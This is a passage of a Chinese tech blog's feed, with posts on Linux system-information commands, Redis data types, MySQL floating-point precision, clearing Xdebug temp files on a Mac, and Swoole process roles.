    <category term="碎碎念" scheme="https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>Linux 查看系统、硬件信息</title>
    <link href="https://www.0x2beace.com/linux-view-system-and-hardware-information/"/>
    <id>https://www.0x2beace.com/linux-view-system-and-hardware-information/</id>
    <published>2020-11-09T14:33:03.000Z</published>
    <updated>2020-11-09T14:36:19.179Z</updated>
    
    <content type="html"><![CDATA[<p>以下命令都是基于Ubuntu。</p><a id="more"></a><h3 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h3><h4 id="查看内核-操作系统-CPU信息"><a href="#查看内核-操作系统-CPU信息" class="headerlink" title="查看内核/操作系统/CPU信息"></a>查看内核/操作系统/CPU信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br></pre></td></tr></table></figure><h4 id="查看操作系统版本"><a href="#查看操作系统版本" class="headerlink" title="查看操作系统版本"></a>查看操作系统版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ head -n 1 &#x2F;etc&#x2F;issue</span><br></pre></td></tr></table></figure><h4 id="查看机器型号"><a href="#查看机器型号" class="headerlink" title="查看机器型号"></a>查看机器型号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dmidecode | grep &quot;Product Name&quot;</span><br></pre></td></tr></table></figure><h4 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hostname</span><br></pre></td></tr></table></figure><h4 id="列出所有PCI设备"><a href="#列出所有PCI设备" class="headerlink" title="列出所有PCI设备"></a>列出所有PCI设备</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lspci -tv</span><br></pre></td></tr></table></figure><h4 id="列出所有USB设备"><a href="#列出所有USB设备" class="headerlink" title="列出所有USB设备"></a>列出所有USB设备</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsusb -tv</span><br></pre></td></tr></table></figure><h4 id="列出加载的内核模块"><a href="#列出加载的内核模块" class="headerlink" title="列出加载的内核模块"></a>列出加载的内核模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsmod</span><br></pre></td></tr></table></figure><h4 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ env</span><br></pre></td></tr></table></figure><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><h4 id="查看内存使用量和交换区使用量"><a href="#查看内存使用量和交换区使用量" class="headerlink" title="查看内存使用量和交换区使用量"></a>查看内存使用量和交换区使用量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ free -m</span><br></pre></td></tr></table></figure><h4 id="查看各分区使用情况"><a href="#查看各分区使用情况" class="headerlink" title="查看各分区使用情况"></a>查看各分区使用情况</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br></pre></td></tr></table></figure><h4 id="查看总内存量"><a href="#查看总内存量" class="headerlink" title="查看总内存量"></a>查看总内存量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep MemTotal &#x2F;proc&#x2F;meminfo</span><br></pre></td></tr></table></figure><h4 id="查看空闲内存量"><a href="#查看空闲内存量" class="headerlink" title="查看空闲内存量"></a>查看空闲内存量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep MemFree &#x2F;proc&#x2F;meminfo</span><br></pre></td></tr></table></figure><h4 id="查看系统运行时间、用户数、负载"><a href="#查看系统运行时间、用户数、负载" class="headerlink" title="查看系统运行时间、用户数、负载"></a>查看系统运行时间、用户数、负载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uptime</span><br></pre></td></tr></table></figure><h4 id="查看系统负载"><a href="#查看系统负载" class="headerlink" title="查看系统负载"></a>查看系统负载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;loadavg</span><br></pre></td></tr></table></figure><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><h4 id="查看CPU-统计信息"><a href="#查看CPU-统计信息" class="headerlink" title="查看CPU 统计信息"></a>查看CPU 统计信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lscpu</span><br></pre></td></tr></table></figure><h4 id="查看单个CPU-信息"><a href="#查看单个CPU-信息" class="headerlink" title="查看单个CPU 信息"></a>查看单个CPU 信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure><h3 id="磁盘和分区"><a href="#磁盘和分区" class="headerlink" title="磁盘和分区"></a>磁盘和分区</h3><h4 id="查看磁盘空间信息"><a href="#查看磁盘空间信息" class="headerlink" title="查看磁盘空间信息"></a>查看磁盘空间信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br></pre></td></tr></table></figure><h4 id="查看挂接的分区状态"><a href="#查看挂接的分区状态" class="headerlink" title="查看挂接的分区状态"></a>查看挂接的分区状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount | column -t</span><br></pre></td></tr></table></figure><h4 id="查看所有分区"><a href="#查看所有分区" class="headerlink" title="查看所有分区"></a>查看所有分区</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ fdisk -l</span><br></pre></td></tr></table></figure><h4 id="查看所有交换分区"><a href="#查看所有交换分区" class="headerlink" title="查看所有交换分区"></a>查看所有交换分区</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ swapon -s</span><br></pre></td></tr></table></figure><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><h4 id="查看所有网络接口的属性"><a href="#查看所有网络接口的属性" class="headerlink" title="查看所有网络接口的属性"></a>查看所有网络接口的属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig</span><br></pre></td></tr></table></figure><h4 id="查看防火墙设置"><a href="#查看防火墙设置" class="headerlink" title="查看防火墙设置"></a>查看防火墙设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -L</span><br></pre></td></tr></table></figure><h4 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ route -n</span><br></pre></td></tr></table></figure><h4 id="查看所有监听端口"><a href="#查看所有监听端口" class="headerlink" title="查看所有监听端口"></a>查看所有监听端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -lntp</span><br></pre></td></tr></table></figure><h4 id="查看所有已经建立的连接"><a href="#查看所有已经建立的连接" class="headerlink" title="查看所有已经建立的连接"></a>查看所有已经建立的连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -antp</span><br></pre></td></tr></table></figure><h4 id="查看网络统计信息"><a href="#查看网络统计信息" class="headerlink" title="查看网络统计信息"></a>查看网络统计信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -s</span><br></pre></td></tr></table></figure><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h4 id="查看所有进程"><a href="#查看所有进程" class="headerlink" title="查看所有进程"></a>查看所有进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef</span><br></pre></td></tr></table></figure><h4 id="实时显示进程状态"><a href="#实时显示进程状态" class="headerlink" title="实时显示进程状态"></a>实时显示进程状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ top</span><br></pre></td></tr></table></figure><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><h4 id="查看活动用户"><a href="#查看活动用户" class="headerlink" title="查看活动用户"></a>查看活动用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ w</span><br></pre></td></tr></table></figure><h4 id="查看指定用户信息"><a href="#查看指定用户信息" class="headerlink" title="查看指定用户信息"></a>查看指定用户信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ id &lt;用户名&gt;</span><br></pre></td></tr></table></figure><h4 id="查看用户登录日志"><a href="#查看用户登录日志" class="headerlink" title="查看用户登录日志"></a>查看用户登录日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ last</span><br></pre></td></tr></table></figure><h4 id="查看系统所有用户"><a href="#查看系统所有用户" class="headerlink" title="查看系统所有用户"></a>查看系统所有用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cut -d: -f1 &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h4 id="查看系统所有组"><a href="#查看系统所有组" class="headerlink" title="查看系统所有组"></a>查看系统所有组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cut -d: -f1 &#x2F;etc&#x2F;group</span><br></pre></td></tr></table></figure><h4 id="查看当前用户的计划任务"><a href="#查看当前用户的计划任务" class="headerlink" title="查看当前用户的计划任务"></a>查看当前用户的计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -l</span><br></pre></td></tr></table></figure><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><h4 id="列出所有系统服务"><a href="#列出所有系统服务" class="headerlink" title="列出所有系统服务"></a>列出所有系统服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chkconfig --list</span><br></pre></td></tr></table></figure><h4 id="列出所有启动的系统服务"><a href="#列出所有启动的系统服务" class="headerlink" title="列出所有启动的系统服务"></a>列出所有启动的系统服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chkconfig --list | grep on</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://my.oschina.net/hunterli/blog/140783" target="_blank" rel="noopener">Linux 查看CPU信息，机器型号，内存等信息</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;以下命令都是基于Ubuntu。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Redis 常用数据类型整理</title>
    <link href="https://www.0x2beace.com/redis-common-data-types-sorting/"/>
    <id>https://www.0x2beace.com/redis-common-data-types-sorting/</id>
    <published>2020-11-07T14:43:21.000Z</published>
    <updated>2020-11-07T14:46:04.965Z</updated>
    
    <content type="html"><![CDATA[<p>Redis 的五种数据类型分别是：字符串、哈希、列表、集合、无序集合。</p><a id="more"></a><h2 id="Redis-的五种数据类型"><a href="#Redis-的五种数据类型" class="headerlink" title="Redis 的五种数据类型"></a>Redis 的五种数据类型</h2><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>字符串是Redis 的五种数据类型中，最常见最好理解的。</p><p>它的数据结构最简单，就是一个标准的键值对，一个key 对应一个value：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107122134.png" alt=""></p><p>key 是string 的键，可以是字符串也可以是数字。<br>value 是string key 所对应的值，可以是字符串也可以是数字。</p><h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><ul><li><code>incr</code>：计数</li><li><code>set</code> + <code>get</code>：将对象/Json 序列化之后存储作为Cache</li></ul><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>哈希的数据结构很像一个迷你的关系数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107123137.png" alt=""></p><h4 id="应用场景-1"><a href="#应用场景-1" class="headerlink" title="应用场景"></a>应用场景</h4><ul><li><code>hset</code> + <code>hget</code>：Cache</li></ul><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>列表的特点是：</p><ol><li>有序</li><li>允许重复</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107122342.png" alt=""></p><h4 id="应用场景-2"><a href="#应用场景-2" class="headerlink" title="应用场景"></a>应用场景</h4><ul><li><code>lpush</code> + <code>lpop</code>：Stack</li><li><code>lpush</code> + <code>rpop</code>：Queue</li><li><code>lpush</code> + <code>ltrim</code>：Capped Collection</li><li><code>lpush</code> + <code>brpop</code>：Message Queue</li></ul><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>集合特点：</p><ol><li>无序</li><li>不允许重复</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107122610.png" alt=""></p><h4 id="应用场景-3"><a href="#应用场景-3" class="headerlink" title="应用场景"></a>应用场景</h4><ul><li><code>sadd</code>：Tagging</li><li><code>spop/srandmember</code>：Random item</li><li><code>add</code> + <code>sinter</code>：Social Graph</li></ul><h3 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted set"></a>sorted set</h3><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107123412.png" alt=""></p><h4 id="应用场景-4"><a href="#应用场景-4" class="headerlink" title="应用场景"></a>应用场景</h4><ul><li><code>zscore</code>：timeStamp、saleCount、followCount</li></ul><h3 id="通用命令"><a href="#通用命令" class="headerlink" title="通用命令"></a>通用命令</h3><p>查看所有key：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br></pre></td></tr></table></figure><p>查看加载配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get *</span><br></pre></td></tr></table></figure><p>当前数据库的 key 的数量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbsize</span><br></pre></td></tr></table></figure><p>判断key 是否存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exists key</span><br></pre></td></tr></table></figure><p>删除key：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del key</span><br></pre></td></tr></table></figure><p>查看key 的类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type key</span><br></pre></td></tr></table></figure><p>查看内存使用情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info memory</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Redis 的五种数据类型分别是：字符串、哈希、列表、集合、无序集合。&lt;/p&gt;</summary>
    
    
    
    <category term="Redis" scheme="https://www.0x2beace.com/categories/Redis/"/>
    
    
    <category term="Redis" scheme="https://www.0x2beace.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 如何选择 Float、Double、Decimal</title>
    <link href="https://www.0x2beace.com/how-does-mysql-choose-float-double-decimal/"/>
    <id>https://www.0x2beace.com/how-does-mysql-choose-float-double-decimal/</id>
    <published>2020-11-06T14:25:45.000Z</published>
    <updated>2020-12-01T14:22:22.489Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道在Mysql 中存储小数有三种数据类型可做选择，究竟该选择哪一种数据格式，其实并没有统一的答案，得根据实际场景去分析，哪一种更合适。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><p>先来看这样一个例子，假设目前有一张表用来存储用户的积分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;table1&#96; (</span><br><span class="line">  &#96;integral&#96; float(10,2) DEFAULT NULL</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><p>然后向这张表中插入一条数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO &#96;table1&#96; (&#96;integral&#96;) VALUES (131072.32);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM &#96;table1&#96;;</span><br><span class="line">+-----------+</span><br><span class="line">| integral  |</span><br><span class="line">+-----------+</span><br><span class="line">| 131072.31 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过查询数据表可以看到该条记录并不是<code>131072.32</code> 而是<code>131072.31</code>，为什么会这样？这个问题间接暴露出了其他什么问题？</p><ol><li>丢失数据是否是正常现象？</li><li>为什么会少0.01，有没有可能少0.02，或者少1，少10甚至少100？</li><li>怎么样才能让我们的数据尽量准确？</li></ol><h2 id="精度是如何丢失的"><a href="#精度是如何丢失的" class="headerlink" title="精度是如何丢失的"></a>精度是如何丢失的</h2><p>数值类型存储需求<br>|列类型|存储需求|分配内存空间|<br>|-|-|-|<br>|FLOAT(p)|如果0 &lt;= p &lt;= 24为4个字节, 如果25 &lt;= p &lt;= 53为8个字节|32,64|<br>|FLOAT|4个字节|32|<br>|DOUBLE [PRECISION], item REAL|8个字节|64|<br>|DECIMAL(M,D), NUMERIC(M,D)|变长||</p><p>通过查阅<a href="https://www.mysqlzh.com/doc/106/276.html" target="_blank" rel="noopener">官方文档</a>，可以看到<br>在计算机的世界中，浮点数进行存储时，必须要先转换为二进制，通俗一点讲也就是浮点数的精度实际上是由二进制的精度来决定的。</p><p>我们知道对于float类型的数据，只分配了32位的存储空间，对于double类型值分配了64位，但是并不是所有的实数都能转成32位或者64位的二进制形式，<strong>如果超过了，就会出现截断，这就是误差的来源</strong>。</p><p>比如将上面例子中的 <code>131072.32</code> 转成二进制后的数据为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">100000000000000000.0101000111101011100001010001111010111000010100011111…</span><br></pre></td></tr></table></figure><p>这是一个无穷数，对于float 类型，只能截取前32位进行存储，对于double只能截取前64位进行存储。</p><ul><li>对于 float 而言，最终存储的值是：<code>01001000000000000000000000010100</code></li><li>对于 double 而言，最终存储的值是：<code>0100000100000000000000000000001010001111010111000010100011110101</code></li></ul><p>所以我们暂时可以得出一个结论：</p><h2 id="认识Float、Decimal"><a href="#认识Float、Decimal" class="headerlink" title="认识Float、Decimal"></a>认识Float、Decimal</h2><p>Float 和 Decimal 这类数据类型都可以通过两位参数来控制其精度。</p><p>其存储格式是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLOAT&#x2F;DECIMAIL [(M,D)] [UNSIGNED] [ZEROFILL]</span><br></pre></td></tr></table></figure><h3 id="常见误区"><a href="#常见误区" class="headerlink" title="常见误区"></a>常见误区</h3><ol><li>精度总能精确到D 位。</li></ol><p>存储空间大小决定存储精度，和D值无关，Float 的存储空间只有32 位，当需要存储的二进制大于32 位时，就会截断（四舍五入）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table table2 (integral float(15,2));</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into table2 values (123456789.39);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from table2;</span><br><span class="line">+--------------+</span><br><span class="line">| integral     |</span><br><span class="line">+--------------+</span><br><span class="line">| 123456792.00 |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ol start="2"><li>数据存储只能存储到D 位</li></ol><p>浮点型数据最终都要被转成二进制进行存储。并且对于float 而言，存储类型只能是32位0和1的组合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from table1;</span><br><span class="line">+-----------+</span><br><span class="line">| integral  |</span><br><span class="line">+-----------+</span><br><span class="line">| 131072.31 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; alter table table1 modify integral float(10,4);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from table1;</span><br><span class="line">+-------------+</span><br><span class="line">| integral    |</span><br><span class="line">+-------------+</span><br><span class="line">| 131072.3125 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><code>DECIMAL(M,D)</code>中，D 值的是小数部分的位数。可以看到，当修改了D 的值，这个时候可以看到MySQL 真正存储的数值也发生了变化。</p><ol start="3"><li>int(3)/int(5) 区别</li></ol><ul><li>正常显示没有区别。</li><li>3 和 5 仅是最小显示宽度而已，并不代表最多存储宽度。</li><li>有 zerofill 等扩展属性时则显示有区别。</li></ul><p>总结：</p><ol><li>若插入的值未指定小数部分或者小数部分不足D 位则会自动补到D 位小数。</li><li>若插入的值小数部分超过了D 为则会发生截断，截取前D 位小数(四舍五入截取)。</li><li>M 值指是整数部分加小数部分的总长度，也即插入的数字整数部分不能超过M-D 位，否则不能成功插入，会报超出范围的错误。</li></ol><h3 id="如何选择Float、Double、Decimal"><a href="#如何选择Float、Double、Decimal" class="headerlink" title="如何选择Float、Double、Decimal"></a>如何选择Float、Double、Decimal</h3><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://blog.leanote.com/post/weibo-007/mysql_float_double_decimal" target="_blank" rel="noopener">MySQL如何选择float, double, decimal</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;我们知道在Mysql 中存储小数有三种数据类型可做选择，究竟该选择哪一种数据格式，其实并没有统一的答案，得根据实际场景去分析，哪一种更合适。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Mac 临时文件占用过多磁盘空间</title>
    <link href="https://www.0x2beace.com/mac-temporary-files-take-up-too-much-disk-space/"/>
    <id>https://www.0x2beace.com/mac-temporary-files-take-up-too-much-disk-space/</id>
    <published>2020-11-05T12:09:58.000Z</published>
    <updated>2020-11-07T07:58:37.436Z</updated>
    
    <content type="html"><![CDATA[<p>最近使用Mac 时，被告知磁盘空间严重不足了，我心想最近又没有下载什么大文件，怎么会突然满盘了。</p><a id="more"></a><p>于是使用DaisyDisk 扫描了一下磁盘空间，发现其中多达 186 G 全是临时文件。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/%E7%A3%81%E7%9B%98.jpg" alt=""></p><p>起初以为是系统产生的临时文件。因为并不知道这些文件是如何产生的，所以也不太敢直接删除，只尝试过重启电脑但并没有用。</p><p>后来通过Apple 社区提问才了解到，原来<code>cachegrind.out</code> 这类文件全是 Xdebug 的输出文件！所以是可以直接删除掉的～</p><p>此前从未清理过这类文件，所以才会导致临时文件如此之大…</p><p>可以打开终端，使用如下命令进行清理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.*</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line">sudo find &#x2F;private&#x2F;var&#x2F;tmp -name &quot;cachegrind*&quot; -exec rm -rf &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>因为本地应用的Xdebug 一直都是开启着的，所以请求该应用时，Xdebug 就会将调试信息输出至临时文件了，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201105140351.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近使用Mac 时，被告知磁盘空间严重不足了，我心想最近又没有下载什么大文件，怎么会突然满盘了。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/tags/Skill/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Swoole 基础知识学习</title>
    <link href="https://www.0x2beace.com/swoole-basic-knowledge-learning/"/>
    <id>https://www.0x2beace.com/swoole-basic-knowledge-learning/</id>
    <published>2020-11-03T14:33:46.000Z</published>
    <updated>2020-11-03T14:35:50.059Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来记录Swoole 基础知识的学习。</p><a id="more"></a><h2 id="Master、Manager、Worker、Reactor"><a href="#Master、Manager、Worker、Reactor" class="headerlink" title="Master、Manager、Worker、Reactor"></a>Master、Manager、Worker、Reactor</h2><h3 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h3><p>Master 进程是一个多线程进程。</p><h3 id="Manager-进程"><a href="#Manager-进程" class="headerlink" title="Manager 进程"></a>Manager 进程</h3><p>负责创建 / 回收 worker/task 进程</p><h3 id="Worker-进程"><a href="#Worker-进程" class="headerlink" title="Worker 进程"></a>Worker 进程</h3><ul><li>接受由 Reactor 线程投递的请求数据包，并执行 PHP 回调函数处理数据</li><li>生成响应数据并发给 Reactor 线程，由 Reactor 线程发送给 TCP 客户端</li><li>可以是异步非阻塞模式，也可以是同步阻塞模式</li><li>Worker 以多进程的方式运行</li></ul><h3 id="Reactor-线程"><a href="#Reactor-线程" class="headerlink" title="Reactor 线程"></a>Reactor 线程</h3><ul><li>Reactor 线程是在 Master 进程中创建的线程</li><li>负责维护客户端 TCP 连接、处理网络 IO、处理协议、收发数据</li><li>不执行任何 PHP 代码</li><li>将 TCP 客户端发来的数据缓冲、拼接、拆分成完整的一个请求数据包</li></ul><p>有一个更加通俗的比喻来描述这三者的关系：<br>假设 <code>Server</code> 就是一个工厂，那 <code>Reactor</code> 就是销售，接受客户订单。而 <code>Worker</code>就是工人，当销售接到订单后，<code>Worker</code>去工作生产出客户要的东西，而 <code>TaskWorker</code> 可以理解为行政人员，可以帮助 <code>Worker</code> 干些杂事，让 <code>Worker</code>专心工作。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>IPv4 使用 127.0.0.1 表示监听本机，0.0.0.0 表示监听所有地址<br>IPv6 使用::1 表示监听本机，:: (相当于 